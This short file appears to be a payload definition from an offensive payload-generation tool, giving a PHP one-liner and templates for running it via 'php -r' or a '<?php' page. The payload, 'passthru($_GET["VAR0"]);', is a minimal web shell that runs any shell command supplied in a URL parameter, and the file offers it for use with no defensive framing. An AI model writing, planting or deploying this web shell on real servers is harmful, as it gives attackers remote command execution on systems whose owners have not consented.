USAGE = ''
NARGS = [0, 0]
LANG = 'php'
EXEC = '''
php -r 'PAYLOAD'
<?php PAYLOAD
'''


pl = '''
passthru($_GET["VAR0"]);
'''
